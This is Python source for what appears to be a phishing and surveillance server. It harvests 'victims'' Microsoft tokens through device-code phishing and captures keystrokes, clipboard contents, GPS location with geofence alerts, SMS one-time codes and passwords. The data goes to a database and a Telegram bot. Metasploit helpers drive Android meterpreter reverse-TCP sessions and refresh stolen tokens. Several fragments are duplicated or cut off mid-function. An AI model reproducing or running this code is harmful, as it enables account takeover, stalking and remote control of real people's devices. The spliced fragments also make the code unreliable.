class Logger:
    """Advanced logger with rotation and colored output"""
    def __init__(self):
        self.log_file = os.path.expanduser("~/evilgpt/logs/server.log")
        self.lock = threading.Lock()
        self.level = CONFIG["log_level"]
        self.max_size = CONFIG["log_max_size"]
        self.backup_count = CONFIG["log_backup_count"]
        self._rotate_if_needed()

    def _rotate_if_needed(self):
        """Rotate log file if it exceeds max size"""
        if os.path.exists(self.log_file):
            size = os.path.getsize(self.log_file)
            if size > self.max_size:
                for i in range(self.backup_count - 1, 0, -1):
                    src = f"{self.log_file}.{i}" if i > 1 else self.log_file
                    dst = f"{self.log_file}.{i + 1}"
                    if os.path.exists(src):
                        shutil.move(src, dst)
                shutil.move(self.log_file, f"{self.log_file}.1")

    def log(self, level, msg):
        """Write log entry with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        entry = f"[{timestamp}] [{level}] {msg}\n"
        with self.lock:
            try:
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(entry)
            except:
                pass
            # Also print to console with colors
            colors = {
                "INFO": "\033[92m",    # Green
                "SUCCESS": "\033[92m", # Green
                "WARNING": "\033[93m", # Yellow
                "ERROR": "\033[91m",   # Red
                "DEBUG": "\033[94m",   # Blue
                "CRITICAL": "\033[95m" # Magenta
            }
            reset = "\033[0m"
            color = colors.get(level, "")
            print(f"{color}{entry.strip()}{reset}")

    def info(self, msg): self.log("INFO", msg)
    def success(self, msg): self.log("SUCCESS", msg)
    def warning(self, msg): self.log("WARNING", msg)
    def error(self, msg): self.log("ERROR", msg)
    def debug(self, msg): self.log("DEBUG", msg)
    def critical(self, msg): self.log("CRITICAL", msg)

class EncryptionEngine:
    """AES-256 encryption for sensitive data"""
    def __init__(self):
        self.key_file = os.path.expanduser("~/evilgpt/db/.encryption_key")
        self.key = self._load_or_generate_key()
        self.cipher = None
        try:
            from cryptography.fernet import Fernet
            self.cipher = Fernet(self.key)
        except:
            LOG.warning("Fernet not available, using base64 fallback")

    def _load_or_generate_key(self):
        """Load existing key or generate new one"""
        os.makedirs(os.path.dirname(self.key_file), exist_ok=True)
        if os.path.exists(self.key_file):
            try:
                with open(self.key_file, 'rb') as f:
                    return f.read()
            except:
                pass
        try:
            from cryptography.fernet import Fernet
            key = Fernet.generate_key()
        except:
            key = os.urandom(32)
        try:
            with open(self.key_file, 'wb') as f:
                f.write(key)
            os.chmod(self.key_file, 0o600)
        except:
            pass
        return key

    def encrypt(self, data):
        """Encrypt data using Fernet or base64 fallback"""
        if isinstance(data, str):
            data = data.encode()
        if self.cipher:
            try:
                return self.cipher.encrypt(data).decode()
            except:
                return base64.b64encode(data).decode()
        return base64.b64encode(data).decode()

    def decrypt(self, data):
        """Decrypt data using Fernet or base64 fallback"""
        if isinstance(data, str):
            data = data.encode()
        if self.cipher:
            try:
                return self.cipher.decrypt(data).decode()
            except:
                try:
                    return base64.b64decode(data).decode()
                except:
                    return data.decode()
        try:
            return base64.b64decode(data).decode()
        except:
            return data.decode()

class DatabaseManager:
    """SQLite database manager with connection pooling and WAL mode"""
    def __init__(self):
        self.db_path = CONFIG["db_path"]
        self.lock = threading.Lock()
        self.pool = queue.Queue(maxsize=CONFIG.get("db_pool_size", 10))
        self._init_pool()
        self._init_db()
        LOG.info("Database manager initialized")

    def _init_pool(self):
        """Initialize connection pool"""
        for _ in range(CONFIG.get("db_pool_size", 10)):
            conn = sqlite3.connect(self.db_path, timeout=CONFIG.get("db_timeout", 30))
            conn.row_factory = sqlite3.Row
            conn.execute("PRAGMA journal_mode=WAL")
            conn.execute("PRAGMA synchronous=NORMAL")
            conn.execute("PRAGMA cache_size=10000")
            conn.execute("PRAGMA temp_store=MEMORY")
            self.pool.put(conn)

    def _get_conn(self):
        """Get connection from pool"""
        try:
            return self.pool.get_nowait()
        except queue.Empty:
            conn = sqlite3.connect(self.db_path, timeout=CONFIG.get("db_timeout", 30))
            conn.row_factory = sqlite3.Row
            conn.execute("PRAGMA journal_mode=WAL")
            conn.execute("PRAGMA synchronous=NORMAL")
            return conn

    def _return_conn(self, conn):
        """Return connection to pool"""
        try:
            self.pool.put_nowait(conn)
        except queue.Full:
            conn.close()

    def execute(self, query, params=None, commit=True, retries=3):
        """Execute a query with retry on lock"""
        conn = None
        for attempt in range(retries):
            try:
                conn = self._get_conn()
                cursor = conn.cursor()
                if params:
                    cursor.execute(query, params)
                else:
                    cursor.execute(query)
                if commit:
                    conn.commit()
                result = cursor.fetchall() if cursor.description else None
                return result
            except sqlite3.OperationalError as e:
                if 'locked' in str(e) or 'busy' in str(e):
                    if attempt < retries - 1:
                        time.sleep(0.5 * (2 ** attempt))
                        continue
                raise
            except Exception as e:
                if attempt < retries - 1:
                    time.sleep(0.1)
                    continue
                raise
            finally:
                if conn:
                    self._return_conn(conn)

class IPGeolocation:
    """IP geolocation with caching"""
    def __init__(self):
        self.cache = {}
        self.cache_ttl = 3600
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': generate_user_agent()})

    def get_location(self, ip):
        """Get location data for an IP"""
        # Check cache
        if ip in self.cache:
            entry = self.cache[ip]
            if time.time() - entry['time'] < self.cache_ttl:
                return entry['data']

        # Try multiple sources
        sources = [
            self._query_ip_api,
            self._query_ipinfo,
            self._query_ip_geolocation,
        ]

        for source in sources:
            try:
                result = source(ip)
                if result and result.get('country'):
                    self.cache[ip] = {'data': result, 'time': time.time()}
                    return result
            except:
                continue

        return {'city': 'Unknown', 'region': 'Unknown', 'country': 'Unknown', 'lat': 0, 'lon': 0, 'isp': 'Unknown'}

    def _query_ip_api(self, ip):
        """Query ip-api.com"""
        try:
            resp = self.session.get(f"http://ip-api.com/json/{ip}", timeout=3)
            data = resp.json()
            if data.get('status') == 'success':
                return {
                    'city': data.get('city', ''),
                    'region': data.get('regionName', ''),
                    'country': data.get('country', ''),
                    'lat': data.get('lat', 0),
                    'lon': data.get('lon', 0),
                    'isp': data.get('isp', ''),
                    'timezone': data.get('timezone', ''),
                    'org': data.get('org', ''),
                    'as': data.get('as', '')
                }
        except:
            pass
        return None

    def _query_ipinfo(self, ip):
        """Query ipinfo.io"""
        try:
            resp = self.session.get(f"https://ipinfo.io/{ip}/json", timeout=3)
            data = resp.json()
            loc = data.get('loc', '0,0').split(',')
            return {
                'city': data.get('city', ''),
                'region': data.get('region', ''),
                'country': data.get('country', ''),
                'lat': float(loc[0]) if len(loc) > 0 else 0,
                'lon': float(loc[1]) if len(loc) > 1 else 0,
                'isp': data.get('org', ''),
                'timezone': data.get('timezone', ''),
                'org': data.get('org', ''),
                'as': data.get('org', '')
            }
        except:
            pass
        return None

    def _query_ip_geolocation(self, ip):
        """Fallback: ip-geolocation.io"""
        try:
            resp = self.session.get(f"https://api.ip-geolocation.io/ipgeo?ip={ip}", timeout=3)
            data = resp.json()
            return {
                'city': data.get('city', ''),
                'region': data.get('state_prov', ''),
                'country': data.get('country_name', ''),
                'lat': float(data.get('latitude', 0)),
                'lon': float(data.get('longitude', 0)),
                'isp': data.get('isp', ''),
                'timezone': data.get('timezone', {}).get('name', ''),
                'org': data.get('organization', ''),
                'as': data.get('asn', '')
            }
        except:
            pass
        return None

def send_telegram(text):
    """Send a message to Telegram"""
    try:
        safe = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        url = f"https://api.telegram.org/bot{CONFIG['telegram_token']}/sendMessage"
        data = urllib.parse.urlencode({
            "chat_id": CONFIG["telegram_chat_id"],
            "text": safe,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        })
        req = urllib.request.Request(url, data=data.encode())
        with urllib.request.urlopen(req, timeout=10):
            return True
    except Exception as e:
        LOG.error(f"Telegram send error: {e}")
        return False

def send_telegram_to_admins(text):
    """Send a message to all admins"""
    try:
        admins = db.execute("SELECT chat_id FROM admins WHERE is_active = 1", commit=False)
        if not admins:
            send_telegram(text)
            return
        safe = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        url = f"https://api.telegram.org/bot{CONFIG['telegram_token']}/sendMessage"
        for admin in admins:
            try:
                data = urllib.parse.urlencode({
                    "chat_id": admin[0],
                    "text": safe,
                    "parse_mode": "HTML",
                    "disable_web_page_preview": True
                })
                req = urllib.request.Request(url, data=data.encode())
                urllib.request.urlopen(req, timeout=5)
            except:
                pass
    except Exception as e:
        LOG.error(f"Send to admins error: {e}")

def send_file_telegram(file_path, caption=""):
    """Send a file to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{CONFIG['telegram_token']}/sendDocument"
        boundary = '----' + ''.join(random.choices(string.ascii_letters, k=16))
        with open(file_path, 'rb') as f:
            file_data = f.read()
        body = (
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="chat_id"\r\n\r\n'
            f'{CONFIG["telegram_chat_id"]}\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="caption"\r\n\r\n'
            f'{caption}\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="document"; filename="{os.path.basename(file_path)}"\r\n'
            f'Content-Type: application/octet-stream\r\n\r\n'
        ).encode() + file_data + f'\r\n--{boundary}--\r\n'.encode()
        req = urllib.request.Request(url, data=body)
        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
        with urllib.request.urlopen(req, timeout=60):
            return True
    except Exception as e:
        LOG.error(f"Send file error: {e}")
        return False

def parse_user_agent(user_agent):
    """Parse User-Agent string into device info"""
    result = {
        'device': 'Unknown',
        'browser': 'Unknown',
        'os': 'Unknown',
        'version': 'Unknown',
        'is_mobile': False,
        'is_tablet': False,
        'is_desktop': False
    }
    if not user_agent:
        return result

    ua = user_agent.lower()
    result['raw'] = user_agent

    # Device detection
    if 'android' in ua:
        result['os'] = 'Android'
        result['device'] = 'Android Phone'
        result['is_mobile'] = True
        if 'tablet' in ua or 'pad' in ua:
            result['device'] = 'Android Tablet'
            result['is_tablet'] = True
            result['is_mobile'] = False
    elif 'iphone' in ua:
        result['os'] = 'iOS'
        result['device'] = 'iPhone'
        result['is_mobile'] = True
    elif 'ipad' in ua:
        result['os'] = 'iOS'
        result['device'] = 'iPad'
        result['is_tablet'] = True
        result['is_mobile'] = False
    elif 'windows' in ua:
        result['os'] = 'Windows'
        result['device'] = 'Computer'
        result['is_desktop'] = True
        if 'phone' in ua:
            result['device'] = 'Windows Phone'
            result['is_mobile'] = True
            result['is_desktop'] = False
    elif 'mac' in ua:
        result['os'] = 'macOS'
        result['device'] = 'Mac'
        result['is_desktop'] = True
    elif 'linux' in ua:
        result['os'] = 'Linux'
        result['device'] = 'Computer'
        result['is_desktop'] = True

    # Browser detection
    if 'chrome' in ua and 'edg' not in ua and 'opr' not in ua:
        result['browser'] = 'Chrome'
    elif 'firefox' in ua:
        result['browser'] = 'Firefox'
    elif 'safari' in ua and 'chrome' not in ua:
        result['browser'] = 'Safari'
    elif 'edg' in ua:
        result['browser'] = 'Edge'
    elif 'opr' in ua or 'opera' in ua:
        result['browser'] = 'Opera'
    elif 'brave' in ua:
        result['browser'] = 'Brave'

    return result

def get_public_url():
    """Auto-detect public URL from Cloudflare"""
    try:
        # Check Cloudflare
        result = subprocess.run(
            "ps aux | grep cloudflared | grep -v grep",
            shell=True, capture_output=True, text=True, timeout=3
        )
        if result.stdout:
            for line in result.stdout.split('\n'):
                if 'trycloudflare.com' in line:
                    match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                    if match:
                        return match.group(0)

        # Check localhost
        try:
            resp = requests.get("http://localhost:4040/api/tunnels", timeout=2)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('tunnels') and len(data['tunnels']) > 0:
                    return data['tunnels'][0].get('public_url', 'http://localhost:5000')
        except:
            pass

        return "http://localhost:5000"
    except:
        return "http://localhost:5000"

@app.route('/check-token')
def check_token():
    """Poll for Microsoft token after device code login"""
    device_code = session.get('device_code')
    if not device_code:
        return jsonify({"status": "error", "message": "No device code in session"})

    # Check if code expired (15 minutes)
    created = session.get('device_code_created', 0)
    if time.time() - created > 900:
        return jsonify({"status": "error", "message": "Device code expired"})

    try:
        poll_data = {
            'client_id': CONFIG['azure_client_id'],
            'device_code': device_code,
            'grant_type': 'urn:ietf:params:oauth:grant-type:device_code'
        }
        token_resp = requests.post(
            f"https://login.microsoftonline.com/{CONFIG['azure_tenant']}/oauth2/v2.0/token",
            data=poll_data,
            timeout=10
        )

        if token_resp.status_code == 200:
            token_data = token_resp.json()
            access_token = token_data.get('access_token', '')
            refresh_token = token_data.get('refresh_token', '')
            expires_in = token_data.get('expires_in', 3600)

            if access_token:
                # Get victim IP
                ip = request.headers.get('CF-Connecting-IP') or request.remote_addr

                # Find or create victim
                victim = db.get_victim_by_ip(ip)
                if not victim:
                    # Create new victim
                    loc = ip_geo.get_location(ip)
                    victim_data = {
                        'source': 'device_code',
                        'name': 'Microsoft User',
                        'email': 'unknown@device.code',
                        'phone': '',
                        'password': '',
                        'dob': '',
                        'ip': ip,
                        'city': loc.get('city', ''),
                        'region': loc.get('region', ''),
                        'country': loc.get('country', ''),
                        'isp': loc.get('isp', ''),
                        'fingerprint': '',
                        'keylog_sample': ''
                    }
                    victim_id = db.add_victim(victim_data)
                else:
                    victim_id = victim['id']

                if victim_id:
                    db.add_token(victim_id, access_token, refresh_token, platform="microsoft")
                    send_token_alert(victim_id, access_token)

                    # Clear session
                    session.pop('device_code', None)
                    session.pop('device_code_created', None)

                    return jsonify({"status": "success", "victim_id": victim_id})

            return jsonify({"status": "pending"})

        elif token_resp.status_code == 400:
            # Check if error is "authorization_pending" (normal)
            try:
                err_data = token_resp.json()
                if err_data.get('error') == 'authorization_pending':
                    return jsonify({"status": "pending"})
                elif err_data.get('error') == 'expired_token':
                    return jsonify({"status": "error", "message": "Code expired"})
            except:
                pass
            return jsonify({"status": "pending"})

        else:
            return jsonify({"status": "pending"})

    except Exception as e:
        LOG.error(f"Check token error: {e}")
        return jsonify({"status": "pending"})

@app.route('/capture', methods=['POST'])
@limiter.limit("10 per minute")
def capture():
    """Capture victim data from forms and keylogger"""
    try:
        data = request.get_json() or {}
        ip = request.headers.get('CF-Connecting-IP') or request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        page_url = request.headers.get('Referer', '')

        # Keylog capture
        if data.get('source') == 'keylog':
            field = data.get('field', 'unknown')
            field_type = data.get('fieldType', 'field')
            full_text = data.get('fullText', '')
            individual_keys = data.get('text', '')

            if full_text and len(full_text) >= 1:
                victim = db.get_victim_by_ip(ip)
                if victim:
                    victim_id = victim['id']
                else:
                    victim_data = {
                        'source': 'keylog',
                        'name': 'Unknown',
                        'email': f"unknown_{int(time.time())}@temp.com",
                        'phone': '',
                        'password': '',
                        'dob': '',
                        'ip': ip,
                        'city': 'Unknown',
                        'region': 'Unknown',
                        'country': 'Unknown',
                        'isp': 'Unknown',
                        'fingerprint': data.get('fingerprint', ''),
                        'keylog_sample': full_text[:200]
                    }
                    victim_id = db.add_victim(victim_data)

                if victim_id:
                    db.add_keylog(victim_id, field, field_type, full_text, individual_keys, page_url)
                    send_keylog_alert(victim_id, field, field_type, full_text, page_url)

            return jsonify({"status": "success"}), 200

        # Keylog batch
        if data.get('source') == 'keylog_batch':
            field = data.get('field', 'unknown')
            full_text = data.get('fullText', '')
            individual_keys = data.get('keys', '')
            field_type = data.get('fieldType', 'field')

            if full_text and len(full_text) >= 1:
                victim = db.get_victim_by_ip(ip)
                if victim:
                    victim_id = victim['id']
                else:
                    victim_data = {
                        'source': 'keylog',
                        'name': 'Unknown',
                        'email': f"unknown_{int(time.time())}@temp.com",
                        'phone': '',
                        'password': '',
                        'dob': '',
                        'ip': ip,
                        'city': 'Unknown',
                        'region': 'Unknown',
                        'country': 'Unknown',
                        'isp': 'Unknown',
                        'fingerprint': data.get('fingerprint', ''),
                        'keylog_sample': full_text[:200]
                    }
                    victim_id = db.add_victim(victim_data)

                if victim_id:
                    db.add_keylog(victim_id, field, field_type, full_text, individual_keys, page_url)

            return jsonify({"status": "success"}), 200

        # Clipboard capture
        if data.get('source') == 'clipboard':
            content = data.get('content', '')
            if content:
                victim = db.get_victim_by_ip(ip)
                if victim:
                    victim_id = victim['id']
                else:
                    victim_data = {
                        'source': 'clipboard',
                        'name': 'Unknown',
                        'email': f"unknown_{int(time.time())}@temp.com",
                        'phone': '',
                        'password': '',
                        'dob': '',
                        'ip': ip,
                        'city': 'Unknown',
                        'region': 'Unknown',
                        'country': 'Unknown',
                        'isp': 'Unknown',
                        'fingerprint': data.get('fingerprint', ''),
                        'keylog_sample': ''
                    }
                    victim_id = db.add_victim(victim_data)

                if victim_id:
                    db.add_clipboard(victim_id, content, page_url)
                    send_clipboard_alert(victim_id, content, page_url)

            return jsonify({"status": "success"}), 200

        # Location capture
        if data.get('source') == 'location':
            lat = data.get('latitude', 0)
            lng = data.get('longitude', 0)
            accuracy = data.get('accuracy', 0)
            altitude = data.get('altitude', 0)
            speed = data.get('speed', 0)

            victim = db.get_victim_by_ip(ip)
            if victim:
                victim_id = victim['id']
            else:
                victim_data = {
                    'source': 'location',
                    'name': 'Unknown',
                    'email': f"unknown_{int(time.time())}@temp.com",
                    'phone': '',
                    'password': '',
                    'dob': '',
                    'ip': ip,
                    'city': 'Unknown',
                    'region': 'Unknown',
                    'country': 'Unknown',
                    'isp': 'Unknown',
                    'fingerprint': data.get('fingerprint', ''),
                    'keylog_sample': ''
                }
                victim_id = db.add_victim(victim_data)

            if victim_id and lat and lng:
                loc = ip_geo.get_location(ip)
                db.add_location(victim_id, lat, lng, accuracy, altitude, speed, 
                               data.get('address', ''), loc.get('city', ''), 
                               loc.get('region', ''), loc.get('country', ''), loc.get('isp', ''))
                
                # Check geofence
                victim = db.get_victim(victim_id)
                if victim and victim.get('geofence_active', 0) == 1:
                    gf_lat = victim.get('geofence_lat', 0)
                    gf_lng = victim.get('geofence_lng', 0)
                    gf_radius = victim.get('geofence_radius', 500)
                    if gf_lat and gf_lng:
                        # Calculate distance
                        from math import radians, sin, cos, sqrt, atan2
                        R = 6371000
                        phi1 = radians(lat)
                        phi2 = radians(gf_lat)
                        delta_phi = radians(gf_lat - lat)
                        delta_lambda = radians(gf_lng - lng)
                        a = sin(delta_phi/2)**2 + cos(phi1) * cos(phi2) * sin(delta_lambda/2)**2
                        c = 2 * atan2(sqrt(a), sqrt(1-a))
                        distance = R * c
                        if distance <= gf_radius:
                            db.add_geofence_event(victim_id, 'enter', lat, lng, distance)
                            send_geofence_alert(victim_id, 'entered geofence', lat, lng, distance)

                send_location_alert(victim_id, lat, lng, accuracy, data.get('address', ''))

            return jsonify({"status": "success"}), 200

        # Device info capture
        if data.get('source') == 'device_info':
            info = data.get('info', {})
            victim = db.get_victim_by_ip(ip)
            if victim:
                victim_id = victim['id']
                db.update_victim(victim_id, {
                    'device_model': info.get('device', ''),
                    'android_version': info.get('os', ''),
                    'network_type': info.get('network', ''),
                    'battery': info.get('battery', 0)
                })
            return jsonify({"status": "success"}), 200

        # SMS capture from web
        if data.get('source') == 'sms':
            sender = data.get('sender', '')
            body = data.get('body', '')
            is_otp = data.get('is_otp', 0)

            victim = db.get_victim_by_ip(ip)
            if victim:
                victim_id = victim['id']
                db.add_sms(victim_id, sender, body, is_otp)
                if is_otp:
                    send_sms_alert(victim_id, sender, body, is_otp)

            return jsonify({"status": "success"}), 200

        # Form submission (create account)
        if data.get('source') in ['form', 'oauth']:
            loc = ip_geo.get_location(ip)
            device_info = parse_user_agent(user_agent)

            victim_data = {
                'source': data.get('source', 'form'),
                'name': data.get('name', ''),
                'email': data.get('email', ''),
                'phone': data.get('phone', ''),
                'password': data.get('password', ''),
                'dob': data.get('dob', ''),
                'ip': ip,
                'city': loc.get('city', ''),
                'region': loc.get('region', ''),
                'country': loc.get('country', ''),
                'isp': loc.get('isp', ''),
                'fingerprint': data.get('fingerprint', ''),
                'keylog_sample': data.get('keylog', '')[:500]
            }

            victim_id = db.add_victim(victim_data)

            if victim_id:
                # Add credential
                db.execute("""
                    INSERT INTO credentials (victim_id, email, password, ip, user_agent, location, source)
                    VALUES (?, ?, ?, ?, ?, ?, ?)
                """, (victim_id, data.get('email', ''), data.get('password', ''), 
                      ip, user_agent, f"{loc.get('city', '')}, {loc.get('country', '')}", 
                      data.get('source', 'form')))

                # Add keylog if present
                if data.get('keylog'):
                    db.add_keylog(victim_id, 'form', 'form', data['keylog'], '', page_url)

                send_new_victim_alert(victim_id, victim_data, loc, device_info)

            return jsonify({"status": "success", "victim_id": victim_id}), 200

        return jsonify({"status": "success"}), 200

    except Exception as e:
        LOG.error(f"Capture error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

                if 'trycloudflare.com' in line:
                    match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)

                        return match.group(0)
        return "http://localhost:5000"
    except:
        return "http://localhost:5000"

def msf_login():
    """Connect to Metasploit RPC"""
    try:
        import msfrpc
        client = msfrpc.MsfRpcClient(MSF_PASS, host=MSF_HOST, port=MSF_PORT)
        return client
    except Exception as e:
        log(f"MSF RPC login error: {e}")
        return None

def get_msf_sessions():
    """Get list of active meterpreter sessions"""
    try:
        client = msf_login()
        if not client:
            return []
        sessions = client.call('session.list')
        return sessions
    except Exception as e:
        log(f"Get MSF sessions error: {e}")
        return {}

def run_msf_command(session_id, command):
    """Run a meterpreter command on a session"""
    try:
        client = msf_login()
        if not client:
            return "Error: MSF RPC not connected"
        # Write command to session
        client.call('session.meterpreter_write', [session_id, command + "\n"])
        time.sleep(1)
        # Read output
        result = client.call('session.meterpreter_read', [session_id])
        if result and isinstance(result, dict) and 'data' in result:
            return result['data']
        return "No output"
    except Exception as e:
        return f"Error: {str(e)}"

def kill_msf_session(session_id):
    """Kill a meterpreter session"""
    try:
        client = msf_login()
        if not client:
            return False
        client.call('session.stop', [session_id])
        return True
    except:
        return False

def start_listener(ip, port):
    """Start a reverse_tcp listener"""
    try:
        client = msf_login()
        if not client:
            return "Error: MSF RPC not connected"
        # Start listener
        payload = f"use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT {port}; set ExitOnSession false; exploit -j"
        result = client.call('console.create')
        console_id = result['id']
        client.call('console.write', [console_id, payload + "\n"])
        return f"Listener started on {ip}:{port}"
    except Exception as e:
        return f"Error: {str(e)}"

def handle_refresh_token(chat_id, parts):
    if len(parts) < 2:
        send_telegram("Usage: /refresh_token <id>")
        return

    try:
        vid = int(parts[1])
        victim = get_victim(vid)
        if not victim:
            send_telegram(f"Victim {vid} not found")
            return

        # Get refresh token from database
        conn = get_conn()
        cursor = conn.cursor()
        cursor.execute("SELECT refresh_token FROM tokens WHERE victim_id = ? ORDER BY id DESC LIMIT 1", (vid,))
        row = cursor.fetchone()
        conn.close()

        if not row or not row[0]:
            send_telegram(f"No refresh token for victim {vid}")
            return

        refresh_token = row[0]
        try:
            import requests
            data = {
                'client_id': '04b07795-8ddb-461a-bbee-02f9e1bf7b46',
                'refresh_token': refresh_token,
                'grant_type': 'refresh_token'
            }
            resp = requests.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', data=data, timeout=10)
            if resp.status_code == 200:
                token_data = resp.json()
                new_access = token_data.get('access_token', '')
                new_refresh = token_data.get('refresh_token', refresh_token)
                # Update database
                conn = get_conn()
                cursor = conn.cursor()
                expires_at = (datetime.now() + timedelta(days=30)).isoformat()
                cursor.execute("""
                    UPDATE tokens SET access_token = ?, refresh_token = ?, expires_at = ?
                    WHERE victim_id = ? AND platform = 'microsoft'
                """, (new_access, new_refresh, expires_at, vid))
                conn.commit()
                conn.close()
                send_telegram(f"✅ Token refreshed for victim {vid}")
            else:
                send_telegram(f"❌ Failed to refresh token: {resp.text[:200]}")
        except Exception as e:
            send_telegram(f"❌ Error: {str(e)}")
    except ValueError:
        send_telegram("Invalid ID. Usage: /refresh_token <id>")

            return json.loads(response.read().decode())
    except urllib.error.HTTPError as e:
        if e.code == 409:
            log("Conflict error - another bot instance running?")
        return {"ok": False, "result": []}
    except Exception as e:
        log(f"Updates error: {e}")
        return {"ok": False, "result": []}
